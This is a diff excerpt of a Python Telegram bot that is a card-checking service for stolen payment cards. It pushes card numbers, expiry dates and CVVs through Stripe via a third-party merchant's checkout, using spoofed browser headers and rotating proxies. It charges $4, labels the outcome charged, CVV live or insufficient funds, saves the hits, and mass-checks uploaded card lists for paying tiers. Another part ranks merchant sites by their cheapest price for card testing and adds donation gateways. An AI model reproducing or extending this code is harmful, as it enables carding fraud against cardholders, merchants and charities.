+            'card[cvc]': cvv,
+            'card[exp_month]': mm,
+            'card[exp_year]': yy,
+            'payment_user_agent': 'stripe.js/03270cb259; stripe-js-v3/03270cb259; payment-element',
+            'key': STRIPE_4USD_STRIPE_KEY,
+        }
+        
+        response_pm = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=headers_pm,
+            data=pm_data,
+            timeout=30
+        )
+        
+        if response_pm.status_code != 200:
+            print(f"❌ Payment method creation failed: HTTP {response_pm.status_code}")
+            try:
+                error_data = response_pm.json()
+                error_msg = error_data.get('error', {}).get('message', 'Unknown error')
+                return parse_stripe_4usd_error(error_msg, time.time() - start_time)
+            except:
+                default_result["message"] = "Failed to create payment method"
+                default_result["elapsed"] = time.time() - start_time
+                return default_result
+        
+        pm_result = response_pm.json()
+        payment_method_id = pm_result.get('id')
+        
+        if not payment_method_id:
+            print("❌ No payment method ID")
+            default_result["message"] = "No payment method ID"
+            default_result["elapsed"] = time.time() - start_time
+            return default_result
+        
+        print(f"✅ Payment Method: {payment_method_id}")
+        
+        # ============ STEP 3: Confirm Payment ============
+        print(f"\n🔥 [STEP 3] Confirming payment...")
+        
+        headers_confirm = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': user_agent,
+        }
+        
+        confirm_data = {
+            'payment_method': payment_method_id,
+            'client_secret': client_secret,
+        }
+        
+        response_confirm = session.post(
+            f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
+            headers=headers_confirm,
+            data=confirm_data,
+            timeout=30
+        )
+        
+        elapsed = time.time() - start_time
+        
+        if response_confirm.status_code != 200:
+            print(f"❌ Payment confirmation failed: HTTP {response_confirm.status_code}")
+            try:
+                error_data = response_confirm.json()
+                if 'error' in error_data:
+                    return parse_stripe_4usd_error(error_data['error'], elapsed)
+            except:
+                pass
+            default_result["message"] = f"Payment confirmation failed: HTTP {response_confirm.status_code}"
+            default_result["elapsed"] = elapsed
+            return default_result
+        
+        try:
+            result = response_confirm.json()
+            print(f"\n📥 Payment Result:")
+            print(json.dumps(result, indent=2)[:500])
+        except json.JSONDecodeError as e:
+            print(f"❌ JSON parse error: {e}")
+            default_result["message"] = "Invalid JSON response"
+            default_result["elapsed"] = elapsed
+            return default_result
+        
+        # ============ STEP 4: Parse Result ============
+        if result.get('status') == 'succeeded':
+            print(f"\n✅✅✅ PAYMENT SUCCESSFUL! ($4.00) ✅✅✅")
+            return {
+                "status": "success",
+                "result": "CHARGED",
+                "message": "Payment successful - $4.00 charged",
+                "status_display": "🔥 CHARGED 🔥",
+                "status_category": "charged",
+                "elapsed": elapsed,
+                "price": "$4.00",
+                "gateway": "Stripe 4 USD",
+                "payment_id": result.get('id')
+            }
+        elif result.get('status') == 'requires_action':
+            print(f"\n🔐 3D Secure required")
+            return {
+                "status": "declined",
+                "result": "3DS_REQUIRED",
+                "message": "3D Secure required - Authentication needed",
+                "status_display": "🔐 3DS REQUIRED",
+                "status_category": "approved",
+                "elapsed": elapsed,
+                "price": "$4.00",
+                "gateway": "Stripe 4 USD"
+            }
+        elif 'error' in result:
+            return parse_stripe_4usd_error(result['error'], elapsed)
+        else:
+            return {
+                "status": "declined",
+                "result": "DECLINED",
+                "message": f"Status: {result.get('status', 'Unknown')}",
+                "status_display": "❌ DECLINED",
+                "status_category": "declined",
+                "elapsed": elapsed,
+                "price": "$4.00",
+                "gateway": "Stripe 4 USD"
+            }
+            
+    except requests.Timeout:
+        print(f"⏰ Request timeout")
+        default_result["message"] = "Request timeout"
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+    except requests.ConnectionError as e:
+        print(f"❌ Connection error: {e}")
+        default_result["message"] = f"Connection error: {str(e)[:50]}"
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+    except Exception as e:
+        print(f"❌ Error: {e}")
+        traceback.print_exc()
+        default_result["message"] = str(e)[:100]
+        default_result["elapsed"] = time.time() - start_time
+        return default_result
+
+
+def parse_stripe_4usd_error(error, elapsed):
+    """Parse Stripe 4 USD error response"""
+    if isinstance(error, dict):
+        error_msg = error.get('message', 'Unknown error')
+        error_code = error.get('code', '')
+        decline_code = error.get('decline_code', '')
+    else:
+        error_msg = str(error)
+        error_code = ''
+        decline_code = ''
+    
+    print(f"\n❌ Stripe Error: {error_msg}")
+    print(f"Code: {error_code}, Decline Code: {decline_code}")
+    
+    error_lower = str(error_msg).lower()
+    
+    if 'insufficient_funds' in error_lower or 'insufficient' in error_lower or 'funds' in error_lower:
+        return {
+            "status": "success",
+            "result": "INSUFFICIENT_FUNDS",
+            "message": f"Insufficient funds: {error_msg}",
+            "status_display": "💰 INSUFFICIENT FUNDS",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": "$4.00",
+            "gateway": "Stripe 4 USD"
+        }
+    elif 'cvc' in error_lower or 'security' in error_lower or 'cvv' in error_lower:
+        return {
+            "status": "success",
+            "result": "CVV_LIVE",
+            "message": f"CVV verification failed: {error_msg}",
+            "status_display": "✅ CVV LIVE",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": "$4.00",
+            "gateway": "Stripe 4 USD"
+        }
+    elif 'declined' in error_lower or 'card_declined' in error_lower:
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": f"Card declined: {error_msg}",
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$4.00",
+            "gateway": "Stripe 4 USD"
+        }
+    elif 'expired' in error_lower:
+        return {
+            "status": "declined",
+            "result": "EXPIRED",
+            "message": f"Expired card: {error_msg}",
+            "status_display": "❌ EXPIRED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$4.00",
+            "gateway": "Stripe 4 USD"
+        }
+    elif '3d' in error_lower or 'secure' in error_lower or 'authentication' in error_lower:
+        return {
+            "status": "declined",
+            "result": "3DS_REQUIRED",
+            "message": f"3D Secure required: {error_msg}",
+            "status_display": "🔐 3DS REQUIRED",
+            "status_category": "approved",
+            "elapsed": elapsed,
+            "price": "$4.00",
+            "gateway": "Stripe 4 USD"
+        }
+    elif 'invalid' in error_lower or 'incorrect' in error_lower:
+        return {
+            "status": "declined",
+            "result": "INVALID_CARD",
+            "message": f"Invalid card: {error_msg}",
+            "status_display": "❌ INVALID CARD",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$4.00",
+            "gateway": "Stripe 4 USD"
+        }
+    else:
+        return {
+            "status": "declined",
+            "result": "DECLINED",
+            "message": error_msg,
+            "status_display": "❌ DECLINED",
+            "status_category": "declined",
+            "elapsed": elapsed,
+            "price": "$4.00",
+            "gateway": "Stripe 4 USD"
+        }
+
+
+def format_stripe_4usd_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
+    """Format Stripe 4 USD response for display"""
+    bin_info_text, bank, country, currency_code, country_code = bin_info
+    
+    status_display = result.get("status_display", "⚠️ UNKNOWN")
+    status_category = result.get("status_category", "unknown")
+    message = result.get("message", "Unknown")
+    elapsed = result.get("elapsed", 0)
+    gateway = result.get("gateway", "Stripe 4 USD")
+    price = result.get("price", "$4.00")
+    
+    # Parse card for display
+    card_parts = card.split('|')
+    card_num = card_parts[0] if len(card_parts) > 0 else card
+    exp_month = card_parts[1] if len(card_parts) > 1 else "XX"
+    exp_year = card_parts[2] if len(card_parts) > 2 else "XX"
+    exp_year_short = exp_year[-2:] if len(exp_year) == 4 else exp_year
+    cvv = card_parts[3] if len(card_parts) > 3 else "XXX"
+    
+    # Clean message
+    clean_message = message[:80]
+    if len(message) > 80:
+        clean_message += "..."
+    
+    # Format country with flag
+    country_name = country.replace('🌐', '').strip()
+    flag_map = {
+        'USA': '🇺🇸', 'UNITED STATES': '🇺🇸', 'UK': '🇬🇧', 'CANADA': '🇨🇦',
+        'AUSTRALIA': '🇦🇺', 'INDIA': '🇮🇳', 'UAE': '🇦🇪'
+    }
+    country_flag = "🌍"
+    for key, flag in flag_map.items():
+        if key in country_name.upper():
+            country_flag = flag
+            break
+    
+    # Format bank name
+    bank_display = bank if bank != 'N/A' else "Unknown"
+    if len(bank_display) > 25:
+        bank_display = bank_display[:22] + "..."
+    
+    # Determine emoji based on status
+    if "CHARGED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        status_text = "CHARGED"
+    elif "INSUFFICIENT" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["money"], "💰")
+        status_text = "INSUFFICIENT FUNDS"
+    elif "CVV LIVE" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "CVV LIVE"
+    elif "3D" in status_display or "3DS" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["lock"], "🔐")
+        status_text = "3D REQUIRED"
+    elif "APPROVED" in status_display:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        status_text = "APPROVED"
+    else:
+        status_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        status_text = "DECLINED"
+    
+    # Build output
+    ui = (
+        f"┏━━━━━━━⍟\n"
+        f"┃ {status_emoji} {status_text}\n"
+        f"┗━━━━━━━━━━━⊛\n\n"
+        f"[⌬] 𝐂𝐚𝐫𝐝 ↣ <code>{card_num}|{exp_month}|{exp_year_short}|{cvv}</code>\n"
+        f"[⌬] 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↣ {gateway}\n"
+        f"[⌬] 𝐀𝐦𝐨𝐮𝐧𝐭 ↣ {price}\n"
+        f"[⌬] 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↣ {clean_message}\n"
+        f"[⌬] 𝐁𝐈𝐍 ↣ {bin_info_text}\n"
+        f"[⌬] 𝐁𝐚𝐧𝐤 ↣ {bank_display}\n"
+        f"[⌬] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↣ {country_name}\n"
+        f"[⌬] 𝐓𝐢𝐦𝐞 ↣ {elapsed:.2f}s"
+    )
+    
+    return ui, status_category
+
+
+# ============ STRIPE 4 USD SINGLE CHECK ============
+
+@check_gateway("stripe_4usd")
+async def single_check_stripe_4usd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Single card check with Stripe 4 USD gateway - /st <card>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "💳 <b>Stripe 4 USD Gateway</b>\n\n"
+            "Usage: <code>/st &lt;card&gt;</code>\n"
+            "Example: <code>/st 4111111111111111|12|2028|123</code>\n\n"
+            "💰 Amount: $4.00\n"
+            "📍 Gateway: Stripe via alfan.link\n"
+            "✅ Checks: Charged, CVV Live, Insufficient Funds, 3D Secure",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    card_text = " ".join(context.args).strip()
+    
+    # Extract card
+    card = card_formatter.extract_single_card_from_text(card_text)
+    if not card:
+        await message.reply_text(
+            "❌ Invalid card format. Use: NUMBER|MM|YYYY|CVV\n"
+            "Example: 4111111111111111|12|2028|123"
+        )
+        return
+    
+    # Check credits
+    can_proceed, error_msg = await check_and_deduct_credits(user_id, update, context, is_mass_check=False, card_count=1)
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    # Check gateway access
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ <b>Stripe 4 USD not available for {tier.upper()} tier</b>\n\n"
+            f"Upgrade to Premium/Ultimate to use this gateway.",
+            parse_mode=ParseMode.HTML
+        )
+        add_user_credits(user_id, 1)
+        return
+    
+    stripe_4usd_active_tasks[user_id] = True
+    
+    try:
+        tier = user_manager.get_tier(user_id)
+        if user_id not in user_speed_controllers:
+            user_speed_controllers[user_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[user_id]
+        
+        status_msg = await message.reply_text("🔄 Checking card with Stripe 4 USD...")
+        
+        await speed_controller.wait_if_needed()
+        start = time.time()
+        
+        # Get proxy if allowed
+        proxy_str = None
+        if user_manager.can_use_proxy(user_id):
+            if user_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[user_id]:
+                proxy_list = autosopi_proxy_tracker.working_proxies[user_id]
+                if proxy_list:
+                    proxy_str = proxy_list[0]
+                    print(f"🔌 [Stripe 4 USD] Using proxy: {mask_proxy(proxy_str)}")
+        
+        result = await check_card_stripe_4usd(card, proxy_str, user_id)
+        
+        elapsed = time.time() - start
+        speed_controller.record_response(elapsed)
+        
+        bin_info = await get_bin_info(card)
+        
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        
+        ui, status_category = format_stripe_4usd_response(result, card, bin_info)
+        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+        
+        if status_category in ["charged", "approved"]:
+            await save_hit_to_file(
+                card=card, gateway="Stripe 4 USD",
+                response=result.get("message", "Approved"),
+                price="$4.00",
+                bin_info=bin_info, user_id=user_id, user_tier=tier
+            )
+            
+            if status_category == "charged":
+                user_data = user_manager.get_user(user_id)
+                await send_hit_notification(
+                    context=context, gateway="Stripe 4 USD", card=card,
+                    response=result.get("message", "Charged"),
+                    price="$4.00",
+                    user=user_data, bin_info=bin_info, status_category="charged"
+                )
+                user_manager.increment_hits(user_id)
+        
+        user_manager.increment_checks(user_id)
+        
+        # Show remaining credits for free users
+        if user_manager.get_tier(user_id) == 'free':
+            remaining = get_user_credits(user_id)
+            await message.reply_text(
+                f"💎 <b>Credits Remaining: {remaining}</b>\n"
+                f"Use /credits to check balance.",
+                parse_mode=ParseMode.HTML
+            )
+        
+    except Exception as e:
+        try:
+            await status_msg.delete()
+        except:
+            pass
+        await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        print(f"❌ [Stripe 4 USD] Error: {traceback.format_exc()}")
+        add_user_credits(user_id, 1)
+    finally:
+        stripe_4usd_active_tasks.pop(user_id, None)
+
+
+# ============ STRIPE 4 USD MASS CHECK ============
+
+@check_gateway("stripe_4usd")
+async def mass_check_stripe_4usd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Mass card check with Stripe 4 USD gateway - /mst <cards>"""
+    if not await verify_group_access(update, context):
+        return
+    
+    user_id = update.effective_user.id
+    message = update.effective_message
+    
+    if not user_manager.can_access_gateway(user_id, 'stripe_charge'):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Stripe 4 USD not available for {tier.upper()} tier.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    if not user_manager.can_mass_check(user_id):
+        tier = user_manager.get_tier(user_id)
+        await message.reply_text(
+            f"❌ Mass check not available for {tier.upper()} tier.\n\n"
+            f"Use /st for single checks.\n"
+            f"💎 Upgrade to Premium/Ultimate for mass checks.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Check if reply to file
+    if message.reply_to_message and message.reply_to_message.document:
+        try:
+            file = await message.reply_to_message.document.get_file()
+            content = await file.download_as_bytearray()
+            content = content.decode('utf-8', errors='ignore')
+            
+            cards = []
+            for line in content.splitlines():
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    card = card_formatter.extract_single_card_from_text(line)
+                    if card:
+                        cards.append(card)
+            
+            if not cards:
+                await message.reply_text("❌ No valid cards found in file.")
+                return
+                
+            await message.delete()
+            await stripe_4usd_mass_check_logic(update, context, cards, None)
+            return
+            
+        except Exception as e:
+            await message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+            return
+    
+    if not context.args:
+        await message.reply_text(
+            "📦 <b>Stripe 4 USD Mass Check</b>\n\n"
+            "Usage: <code>/mst &lt;card1&gt; &lt;card2&gt; ...</code>\n"
+            "Or reply to a .txt file with /mst\n\n"
+            "Example: <code>/mst 4111111111111111|12|2028|123 4222222222222222|11|2026|456</code>\n\n"
+            "💰 Amount: $4.00\n"
+            "📍 Gateway: Stripe via alfan.link\n"
+            "✅ Only charged/approved cards will be shown\n"
+            "❌ Declined cards are hidden from chat",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    cards_text = " ".join(context.args)
+    card_strings = cards_text.split()
+    
+    cards = []
+    for card_str in card_strings:
+        card = card_formatter.extract_single_card_from_text(card_str)
+        if card:
+            cards.append(card)
+    
+    if not cards:
+        await message.reply_text("❌ No valid cards found.")
+        return
+    
+    # Check batch size limit
+    max_batch = user_manager.get_max_batch_size(user_id)
+    if len(cards) > max_batch:
+        cards = cards[:max_batch]
+        await message.reply_text(f"⚠️ Your tier allows max {max_batch} cards. Truncating.")
+    
+    # Check credits for mass check (1 credit per card for free users)
+    can_proceed, error_msg = await check_and_deduct_mass_credits(user_id, update, context, len(cards))
+    if not can_proceed:
+        await message.reply_text(error_msg, parse_mode=ParseMode.HTML)
+        return
+    
+    try:
+        await message.delete()
+    except:
+        pass
+    
+    await stripe_4usd_mass_check_logic(update, context, cards, None)
+
+
+async def stripe_4usd_mass_check_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: list, progress_msg=None):
+    """Mass check logic for Stripe 4 USD gateway"""
+    u_id = update.effective_user.id
+    message = update.effective_message
+    total = len(cards)
+    
+    print(f"\n{'='*80}")
+    print(f"🚀 [STRIPE 4 USD MASS CHECK] Starting batch for user {u_id}")
+    print(f"📊 Total cards: {total}")
+    print(f"{'='*80}")
+    
+    # Get user's working proxies
+    user_proxies = []
+    if user_manager.can_use_proxy(u_id):
+        if u_id in autosopi_proxy_tracker.working_proxies and autosopi_proxy_tracker.working_proxies[u_id]:
+            user_proxies = autosopi_proxy_tracker.working_proxies[u_id]
+            print(f"🔌 Found {len(user_proxies)} working proxies for rotation")
+    
+    stats = {
+        "charged": 0,
+        "approved": 0,
+        "declined": 0,
+        "errors": 0,
+        "total": total,
+        "processed": 0
+    }
+    
+    start_time = time.time()
+    proxy_index = 0
+    
+    try:
+        stripe_4usd_active_tasks[u_id] = True
+        
+        tier = user_manager.get_tier(u_id)
+        
+        # Process 10 cards at a time
+        CONCURRENCY = 10
+        BATCH_SIZE = 10
+        
+        charged_emoji = premium_emoji(PREMIUM_EMOJI_IDS["charged"], "🔥")
+        approved_emoji = premium_emoji(PREMIUM_EMOJI_IDS["approved"], "✅")
+        dead_emoji = premium_emoji(PREMIUM_EMOJI_IDS["declined"], "❌")
+        errors_emoji = premium_emoji(PREMIUM_EMOJI_IDS["error"], "⚠️")
+        
+        if progress_msg is None:
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe 4 USD\n"
+                f"<b>Status</b> ➛ STARTING...\n"
+                f"<b>Checked</b> ➛ 0/{total}\n"
+                f"<b>Charged</b> ➛ 0 {charged_emoji}\n"
+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+        
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+        
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+        
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 5 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+            
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+            
+            progress_text = (
+                f"<b>Gateway</b> ➛ Stripe 4 USD\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except Exception as e:
+                if "message is not modified" not in str(e).lower():
+                    print(f"⚠️ Progress update error: {e}")
+        
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+            
+            async with semaphore:
+                # Get proxy for this card
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+                
+                await speed_controller.wait_if_needed()
+                start = time.time()
+                result = await check_card_stripe_4usd(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+                
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+                
+                async with stats_lock:
+                    processed_count += 1
+                    
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                        print(f"🔥 [CHARGED] {card[:20]}...")
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED] {card[:20]}...")
+                    else:
+                        stats["declined"] += 1
+                        print(f"⚠️ [ERROR - DECLINED] {card[:20]}...")
+                    
+                    if processed_count % 5 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+                
+                # Send only charged/approved cards
+                if status_category in ["charged", "approved"]:
+                    ui, _ = format_stripe_4usd_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except Exception as e:
+                        print(f"❌ Error sending result: {e}")
+                    
+                    # Save hit
+                    await save_hit_to_file(
+                        card=card, gateway="Stripe 4 USD",
+                        response=result.get("message", "Approved"),
+                        price="$4.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+                    
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway="Stripe 4 USD", card=card,
+                            response=result.get("message", "Charged"),
+                            price="$4.00",
+                            user=user_data, bin_info=bin_info, status_category="charged"
+                        )
+                        user_manager.increment_hits(u_id)
+                
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+        
+        # Process cards in batches
+        for batch_start in range(0, total, BATCH_SIZE):
+            if u_id not in stripe_4usd_active_tasks:
+                break
+            
+            batch_end = min(batch_start + BATCH_SIZE, total)
+            batch_cards = cards[batch_start:batch_end]
+            
+            tasks = []
+            for idx, card in enumerate(batch_cards, batch_start):
+                task = asyncio.create_task(process_single_card(card, idx))
+                tasks.append(task)
+            
+            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
+            
+            for result in batch_results:
+                if isinstance(result, Exception):
+                    print(f"❌ Batch task error: {result}")
+                    async with stats_lock:
+                        stats["declined"] += 1
+                        stats["processed"] += 1
+            
+            # Small delay between batches
+            if batch_end < total:
+                await asyncio.sleep(0.5)
+        
+        # Final summary
+        if u_id in stripe_4usd_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+            
+            skull_emoji = premium_emoji(PREMIUM_EMOJI_IDS["skull"], "💀")
+            
+            summary = (
+                f"{skull_emoji} <b>Stripe 4 USD Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ 0\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+                f"{skull_emoji} <b>Bot</b> ➛ @BLADESARKS_V3bot"
+            )
+            
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+            print(f"📊 Final summary sent to user {u_id}")
+        
+        return stats
+        
+    except Exception as e:
+        print(f"❌ Stripe 4 USD mass check error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+            else:
+                await message.reply_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        stripe_4usd_active_tasks.pop(u_id, None)
+        print(f"🏁 [Stripe 4 USD Mass] Session ended for user {u_id}")
 # ============ HOUR-BASED KEY SYSTEM ============
 # Add this to your f13.py
 
@@ -42857,11 +46047,12 @@ class SiteQualityTracker:
     def __init__(self):
         self.good_sites = set()  # Sites that work properly
         self.bad_sites = set()   # Sites that are problematic
-        self.site_quality = {}   # ← ADD THIS LINE - site -> stats
+        self.site_quality = {}   # site -> stats
+        self.price_cache = {}    # site -> lowest_price (cached for sorting)
         self.load_stats()
     
     def record_response(self, site: str, response_text: str, status_category: str, price: float = None):
-        """Record site response with price validation"""
+        """Record site response with price validation - GOOD sites are under $3"""
         response_upper = response_text.upper()
         
         # Initialize site_quality entry if not exists
@@ -42873,6 +46064,7 @@ class SiteQualityTracker:
                 'last_price': None,
                 'avg_price': 0,
                 'prices': [],
+                'lowest_price': float('inf'),  # Track lowest price seen
                 'last_status': '',
                 'last_time': 0
             }
@@ -42885,6 +46077,12 @@ class SiteQualityTracker:
         # Track price
         if price is not None:
             stats['last_price'] = price
+            # Update lowest price
+            if price < stats['lowest_price']:
+                stats['lowest_price'] = price
+                # Update cache
+                self.price_cache[site] = price
+            
             # Calculate running average
             if stats['avg_price'] == 0:
                 stats['avg_price'] = price
@@ -42905,20 +46103,23 @@ class SiteQualityTracker:
         
         is_good_response = any(indicator in response_upper for indicator in good_indicators)
         
-        # Only mark as GOOD if price is under $10 (when price info is available)
-        is_cheap_price = price is not None and price < 10
+        # GOOD site requires price UNDER $3
+        is_cheap_price = price is not None and price < 3
         
         if is_good_response:
             stats['good_responses'] += 1
             
             if is_cheap_price:
-                # This site is GOOD (works AND has cheap products)
+                # This site is GOOD (works AND has cheap products under $3)
                 self.good_sites.add(site)
+                # Update price cache
+                if price is not None:
+                    self.price_cache[site] = price
                 print(f"🌟 [SITE QUALITY] Site marked as GOOD: {site} (price: ${price:.2f})")
-            elif price is not None and price >= 10:
-                # Response is good but price is too high
+            elif price is not None and price >= 3:
+                # Response is good but price is too high (need <$3)
                 stats['bad_responses'] += 1
-                print(f"⚠️ [SITE QUALITY] Site {site} has good response but price ${price:.2f} is too high (need <$10)")
+                print(f"⚠️ [SITE QUALITY] Site {site} has good response but price ${price:.2f} is too high (need <$3)")
             else:
                 # No price info - don't mark as GOOD yet
                 print(f"ℹ️ [SITE QUALITY] Site {site} has good response but no price info - need more data")
@@ -42938,10 +46139,36 @@ class SiteQualityTracker:
         return site in self.good_sites
     
     def get_site_price(self, site: str) -> float:
-        """Get the average price for a site"""
+        """Get the lowest price for a site"""
+        if site in self.price_cache:
+            return self.price_cache[site]
         if site in self.site_quality:
-            return self.site_quality[site].get('avg_price', 0)
+            return self.site_quality[site].get('lowest_price', 0)
         return 0
+    
+    def get_good_sites_sorted_by_price(self) -> List[str]:
+        """
+        Get all GOOD sites sorted by price (lowest first)
+        """
+        good_sites_with_prices = []
+        
+        for site in self.good_sites:
+            price = self.get_site_price(site)
+            if price > 0 and price < 3:
+                good_sites_with_prices.append((site, price))
+        
+        # Sort by price (lowest first)
+        good_sites_with_prices.sort(key=lambda x: x[1])
+        
+        return [site for site, _ in good_sites_with_prices]
+    
+    def get_site_price_rank(self, site: str) -> int:
+        """Get the price rank of a site (lower price = better rank)"""
+        sorted_sites = self.get_good_sites_sorted_by_price()
+        try:
+            return sorted_sites.index(site) + 1
+        except ValueError:
+            return len(sorted_sites) + 1
     
     def save_stats(self):
         """Save site quality stats to file"""
@@ -42950,6 +46177,7 @@ class SiteQualityTracker:
                 'good_sites': list(self.good_sites),
                 'bad_sites': list(self.bad_sites),
                 'site_quality': self.site_quality,
+                'price_cache': self.price_cache,
                 'timestamp': time.time()
             }
             with open('site_quality.json', 'w') as f:
@@ -42967,6 +46195,7 @@ class SiteQualityTracker:
                     self.good_sites = set(data.get('good_sites', []))
                     self.bad_sites = set(data.get('bad_sites', []))
                     self.site_quality = data.get('site_quality', {})
+                    self.price_cache = data.get('price_cache', {})
                 print(f"📊 Loaded site quality stats: {len(self.good_sites)} good sites")
             except Exception as e:
                 print(f"⚠️ Error loading site quality: {e}")
@@ -44374,6 +47603,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         '/auc': 'autosopi',
         '/shmc': 'autosopi',
         
+        '/mch': 'ezycourse', 
+        '/ch': 'ezycourse',
+        
         # PayPal
         '/ppmc': 'paypal',
         '/ppmcheck': 'paypal',
@@ -44729,6 +47961,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(paypal_donation_50_mass_check_logic(update, context, cards, progress_msg))
     elif gateway == 'united_way_stripe':
         asyncio.create_task(united_way_mass_check_logic(update, context, cards, progress_msg))
+    elif gateway == 'ezycourse':
